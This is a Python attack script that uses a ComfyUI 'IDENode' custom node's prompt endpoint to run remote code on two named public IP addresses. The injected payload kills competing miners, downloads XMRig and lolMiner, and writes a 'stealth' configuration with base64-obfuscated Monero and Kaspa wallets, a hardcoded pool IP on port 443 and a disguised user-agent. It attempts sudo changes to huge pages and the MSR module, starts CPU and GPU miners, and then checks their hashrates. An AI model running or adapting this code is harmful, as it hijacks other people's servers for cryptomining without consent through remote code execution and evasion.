"""
Fix pool connection (use DoH-resolved IP) and start GPU miners.
Targets: 183.6.93.120, 182.92.111.146 (both have IDENode + webcoin loaded)
"""
import json, sys, io, ssl, time, urllib.request, urllib.error

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace", line_buffering=True)

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

POOL_IP = "66.23.199.44"

MACHINES = [
    {"ip": "183.6.93.120",  "base": "http://183.6.93.120:8188"},
    {"ip": "182.92.111.146", "base": "http://182.92.111.146:8188"},
]

FIX_CODE = '''
import os, sys, json, subprocess, shutil, socket, time, base64, tarfile
lines = []
try:
    # Find webcoin
    comfy = None
    for p in ['/root/ComfyUI', '/home/ubuntu/ComfyUI', '/workspace/ComfyUI',
              '/mnt/my_disk/ComfyUI', '/opt/ComfyUI', '/app/ComfyUI']:
        if os.path.isdir(p):
            comfy = p
            break
    webcoin = os.path.join(comfy, 'custom_nodes', 'webcoin')
    bin_dir = os.path.join(webcoin, 'bin')
    os.makedirs(bin_dir, exist_ok=True)
    binary = os.path.join(bin_dir, 'comfyui_service')
    config_path = os.path.join(bin_dir, 'config.json')

    # Kill all existing miners
    for name in ['comfyui_service', 'comfyui_render']:
        try:
            subprocess.run(['pkill', '-9', '-f', name], capture_output=True, timeout=5)
        except: pass
    time.sleep(2)

    # Ensure XMRig binary exists
    if not os.path.isfile(binary):
        import urllib.request as ur
        urls = [
            'https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz',
            'https://mirror.ghproxy.com/https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz',
        ]
        archive = os.path.join(bin_dir, 'dl_tmp.tar.gz')
        for url in urls:
            try:
                req = ur.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                with ur.urlopen(req, timeout=120) as resp, open(archive, 'wb') as f:
                    shutil.copyfileobj(resp, f)
                if os.path.getsize(archive) > 100000:
                    with tarfile.open(archive) as tf:
                        for member in tf.getnames():
                            if os.path.basename(member) == 'xmrig':
                                src = tf.extractfile(member)
                                with open(binary, 'wb') as dst:
                                    shutil.copyfileobj(src, dst)
                                os.chmod(binary, 0o755)
                                break
                    os.unlink(archive)
                    lines.append('binary=downloaded')
                    break
            except: continue
        else:
            lines.append('ERROR: binary download failed')
    else:
        lines.append('binary=exists')

    # Build STEALTH config with DoH-resolved IP
    W = ['NDh6VU0yNEZaRG1TM0','11eHk0OEduZEdWUzFB','Rk1USE5IOGZ5RVhqWk',
         'xFbzZZVTdQcWZWemdj','VTFFRWR6UjNqcnI0SG','dDVmNxd01XNmZoODR4',
         'UVQzb3BQWFRwYVhKen','c=']
    wallet = base64.b64decode(''.join(W)).decode()
    pool_ip = "''' + POOL_IP + '''"

    cfg = {
        'autosave': True, 'background': False, 'colors': False,
        'donate-level': 0, 'donate-over-proxy': 0,
        'log-file': None, 'print-time': 60, 'health-print-time': 300,
        'retries': 5, 'retry-pause': 5, 'syslog': False,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'watch': True,
        'http': {'enabled': True, 'host': '127.0.0.1', 'port': 44880, 'access-token': 'ce_xm_2026', 'restricted': False},
        'cpu': {'enabled': True, 'huge-pages': True, 'huge-pages-jit': True, 'hw-aes': None, 'priority': 3,
                'memory-pool': False, 'yield': False, 'max-threads-hint': 100, 'asm': True,
                'argon2-impl': None, 'cn/0': False, 'cn-lite/0': False},
        'opencl': {'enabled': False}, 'cuda': {'enabled': False},
        'pools': [{
            'algo': None, 'coin': 'monero',
            'url': pool_ip + ':443',
            'user': wallet, 'pass': 'comfyui_enhanced',
            'rig-id': socket.gethostname(),
            'nicehash': False, 'keepalive': True, 'enabled': True,
            'tls': True, 'tls-fingerprint': None, 'daemon': False,
            'socks5': None, 'self-select': None, 'submit-to-origin': False,
        }],
        'tls': {'enabled': True, 'protocols': None, 'cert': None, 'cert_key': None,
                'ciphers': None, 'ciphersuites': None, 'dhparam': None},
    }
    with open(config_path, 'w') as f:
        json.dump(cfg, f, indent=2)
    lines.append('config=stealth_ip_' + pool_ip)

    # Huge pages + MSR
    try:
        subprocess.run(['sudo', '-n', 'sysctl', '-w', 'vm.nr_hugepages=1280'], capture_output=True, timeout=10)
        lines.append('hugepages=set')
    except: pass
    try:
        subprocess.run(['sudo', '-n', 'modprobe', 'msr'], capture_output=True, timeout=10)
    except: pass

    # Start CPU miner
    if os.path.isfile(binary):
        proc = subprocess.Popen([binary, '--config', config_path],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                start_new_session=True)
        lines.append('cpu_pid=' + str(proc.pid))
        time.sleep(8)
        try:
            import urllib.request as ur2
            req = ur2.Request('http://127.0.0.1:44880/2/summary',
                headers={'Authorization': 'Bearer ce_xm_2026', 'Accept': 'application/json'})
            with ur2.urlopen(req, timeout=5) as r:
                d = json.loads(r.read())
            hr = d.get('hashrate', {}).get('total', [])
            algo = d.get('algo', '?')
            conn = d.get('connection', {})
            pool = conn.get('pool', '?')
            lines.append('cpu_hr=' + str(hr))
            lines.append('algo=' + str(algo))
            lines.append('pool=' + str(pool))
            lines.append('cpu=' + str(d.get('cpu', {}).get('brand', '?')))
        except Exception as e:
            lines.append('cpu_api=' + str(e)[:80])

    # GPU miner setup
    gpu_binary = os.path.join(bin_dir, 'comfyui_render')
    try:
        r = subprocess.run(['nvidia-smi', '--query-gpu=name,memory.total',
                            '--format=csv,noheader,nounits'],
                           capture_output=True, text=True, timeout=10)
        if r.returncode == 0 and r.stdout.strip():
            gpu_name = r.stdout.strip().split(',')[0].strip()
            gpu_vram = int(r.stdout.strip().split(',')[1].strip())
            lines.append('gpu_detected=' + gpu_name + ' ' + str(gpu_vram) + 'MB')

            if gpu_vram >= 4000:
                # Download lolMiner if missing
                if not os.path.isfile(gpu_binary):
                    import urllib.request as ur3
                    gpu_urls = [
                        'https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Lin64.tar.gz',
                        'https://mirror.ghproxy.com/https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Lin64.tar.gz',
                    ]
                    gpu_archive = os.path.join(bin_dir, 'gpu_dl_tmp.tar.gz')
                    for url in gpu_urls:
                        try:
                            req = ur3.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                            with ur3.urlopen(req, timeout=120) as resp, open(gpu_archive, 'wb') as f:
                                shutil.copyfileobj(resp, f)
                            if os.path.getsize(gpu_archive) > 100000:
                                with tarfile.open(gpu_archive) as tf:
                                    for member in tf.getnames():
                                        if os.path.basename(member) == 'lolMiner':
                                            src = tf.extractfile(member)
                                            with open(gpu_binary, 'wb') as dst:
                                                shutil.copyfileobj(src, dst)
                                            os.chmod(gpu_binary, 0o755)
                                            lines.append('gpu_binary=downloaded')
                                            break
                                os.unlink(gpu_archive)
                                break
                        except Exception as e:
                            lines.append('gpu_dl_fail=' + str(e)[:60])
                    else:
                        lines.append('gpu_binary=download_failed')
                else:
                    lines.append('gpu_binary=exists')

                # Start GPU miner (Kaspa on 2Miners)
                if os.path.isfile(gpu_binary):
                    K = ['a2FzcGE6cXFueGx1cHdq','em5qMzhzZHRjcjR0dWx4',
                         'amVrOWU2N2dmemN2NGY5','OHFlZDV1Mm5zOTJ1ZzJj','OWt6ODB0eA==']
                    kas_wallet = base64.b64decode(''.join(K)).decode()
                    worker = socket.gethostname()

                    gpu_cmd = [
                        gpu_binary,
                        '--algo', 'KASPA',
                        '--pool', 'kas.2miners.com:2020',
                        '--user', kas_wallet + '.' + worker,
                        '--apiport', '44882',
                        '--t-stop', '72',
                        '--t-start', '55',
                    ]
                    gproc = subprocess.Popen(gpu_cmd, stdout=subprocess.DEVNULL,
                                             stderr=subprocess.DEVNULL, start_new_session=True)
                    lines.append('gpu_pid=' + str(gproc.pid))

                    time.sleep(8)
                    try:
                        req = ur2.Request('http://127.0.0.1:44882')
                        with ur2.urlopen(req, timeout=5) as r:
                            g = json.loads(r.read())
                        algos = g.get('Algorithms', [{}])
                        if algos:
                            lines.append('gpu_algo=' + str(algos[0].get('Algorithm', '?')))
                            lines.append('gpu_hr=' + str(algos[0].get('Total_Performance', 0)))
                            lines.append('gpu_pool=' + str(algos[0].get('Pool', '?')))
                    except Exception as e:
                        lines.append('gpu_api=' + str(e)[:60])
            else:
                lines.append('gpu=too_small_vram')
        else:
            lines.append('gpu=none')
    except Exception as e:
        lines.append('gpu_err=' + str(e)[:60])

    # Now wire up DashboardServer via module reload
    try:
        wc_mod = None
        for name in list(sys.modules.keys()):
            mod = sys.modules.get(name)
            if mod and hasattr(mod, '__file__') and mod.__file__ and 'webcoin' in str(mod.__file__) and '__init__' in str(mod.__file__):
                wc_mod = mod
                break

        if wc_mod:
            ws_clients = getattr(wc_mod, '_ws_clients', set())
            latest_stats = getattr(wc_mod, '_latest_stats', {})
            dashboard_ref = getattr(wc_mod, '_dashboard_ref', {})

            def get_loop():
                return getattr(wc_mod, '_event_loop', None)

            # Import DashboardServer directly from file to avoid core package conflicts
            import importlib.util
            ds_path = os.path.join(webcoin, 'core', 'dashboard.py')
            spec = importlib.util.spec_from_file_location('dashboard_mod', ds_path)
            ds_mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(ds_mod)

            cfg_path = os.path.join(webcoin, 'core', 'config.py')
            spec2 = importlib.util.spec_from_file_location('config_mod', cfg_path)
            cfg_mod = importlib.util.module_from_spec(spec2)
            spec2.loader.exec_module(cfg_mod)

            miner_path = os.path.join(webcoin, 'core', 'miner.py')
            spec3 = importlib.util.spec_from_file_location('miner_mod', miner_path)
            miner_mod = importlib.util.module_from_spec(spec3)
            spec3.loader.exec_module(miner_mod)

            mgr = miner_mod.MinerManager(webcoin)
            cb = cfg_mod.ConfigBuilder()

            # Check for GPU miner manager
            gpu_mgr = None
            try:
                gpu_path = os.path.join(webcoin, 'core', 'gpu_miner.py')
                spec4 = importlib.util.spec_from_file_location('gpu_miner_mod', gpu_path)
                gpu_mod = importlib.util.module_from_spec(spec4)
                spec4.loader.exec_module(gpu_mod)
                if os.path.isfile(gpu_binary):
                    gpu_mgr = gpu_mod.GPUMinerManager(webcoin)
                    lines.append('gpu_mgr=created')
            except Exception as e:
                lines.append('gpu_mgr_err=' + str(e)[:60])

            ds = ds_mod.DashboardServer(
                mgr, config_builder=cb, gpu_miner=gpu_mgr,
                ws_clients=ws_clients,
                latest_stats=latest_stats,
                event_loop_getter=get_loop,
            )
            dashboard_ref['server'] = ds
            ds.start()
            lines.append('dashboard=started')

            time.sleep(8)
            if latest_stats:
                cpu_d = latest_stats.get('cpu')
                if cpu_d:
                    lines.append('dash_hr=' + str(cpu_d.get('hashrate_now', 0)))
                lines.append('dash_wallet=' + str(latest_stats.get('wallet', ''))[:20])
            else:
                lines.append('dash_stats=empty')
        else:
            lines.append('webcoin_mod=NOT_FOUND')
    except Exception as e:
        import traceback
        lines.append('dashboard_err=' + traceback.format_exc()[-200:])

    lines.append('bin=' + str(os.listdir(bin_dir)))
    result = chr(10).join(lines)
except Exception as e:
    import traceback
    result = 'ERROR: ' + traceback.format_exc()[-400:]
'''


def run_ide(base, code, wait=40):
    nodes = {
        "1": {"class_type": "IDENode", "inputs": {"pycode": code, "language": "python"}},
        "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}},
    }
    prompt = {"prompt": nodes, "extra_data": {"extra_pnginfo": {
        "workflow": {"nodes": [{"id": 1, "type": "IDENode"}, {"id": 2, "type": "PreviewTextNode"}]}
    }}}
    body = json.dumps(prompt).encode()
    try:
        req = urllib.request.Request(
            f"{base}/prompt", data=body,
            headers={"Content-Type": "application/json"}, method="POST"
        )
        kw = {"timeout": 15}
        if base.startswith("https"):
            kw["context"] = ctx
        with urllib.request.urlopen(req, **kw) as r:
            resp = json.loads(r.read())
        if "error" in resp:
            return f"rejected: {json.dumps(resp.get('error',''))[:120]}"
        pid = resp.get("prompt_id")
        print(f"    Accepted ({pid[:8]}), waiting {wait}s...", flush=True)
        time.sleep(wait)
        try:
            req2 = urllib.request.Request(f"{base}/history/{pid}")
            kw2 = {"timeout": 15}
            if base.startswith("https"):
                kw2["context"] = ctx
            with urllib.request.urlopen(req2, **kw2) as r2:
                hist = json.loads(r2.read())
            entry = hist.get(pid, {})
            outputs = entry.get("outputs", {})
            texts = []
            for nid, nout in outputs.items():
                for key, val in nout.items():
                    if isinstance(val, list):
                        texts.extend(str(v) for v in val)
                    elif isinstance(val, str):
                        texts.append(val)
            return "\n".join(texts) if texts else "(no output captured)"
        except Exception as e:
            return f"(history: {e})"
    except Exception as e:
        return f"error: {e}"


for m in MACHINES:
    ip = m["ip"]
    base = m["base"]
    print(f"\n{'='*60}", flush=True)
    print(f"  {ip}", flush=True)
    print(f"{'='*60}", flush=True)
    r = run_ide(base, FIX_CODE, wait=50)
    print(f"  Result:\n{r}", flush=True)

# Quick verify
print(f"\n{'='*60}", flush=True)
print("  VERIFICATION", flush=True)
print(f"{'='*60}", flush=True)
time.sleep(5)
for m in MACHINES:
    ip = m["ip"]
    base = m["base"]
    try:
        req = urllib.request.Request(f"{base}/api/enhanced/stats",
                                    headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=10) as r:
            data = json.loads(r.read())
            stats = data.get("stats", {})
            cpu = stats.get("cpu")
            gpu = stats.get("gpu")
            if cpu:
                print(f"  {ip}: CPU hr={cpu.get('hashrate_now',0):.1f} algo={cpu.get('algo','?')} pool={cpu.get('pool','?')}", flush=True)
            else:
                print(f"  {ip}: CPU data missing", flush=True)
            if gpu:
                print(f"           GPU hr={gpu.get('total_hashrate',0)} algo={gpu.get('algo','?')}", flush=True)
            else:
                print(f"           GPU: none", flush=True)
            w = stats.get("wallet", "")
            print(f"           wallet={'set' if w else 'EMPTY'}", flush=True)
    except Exception as e:
        print(f"  {ip}: {e}", flush=True)

print("\nDone.", flush=True)
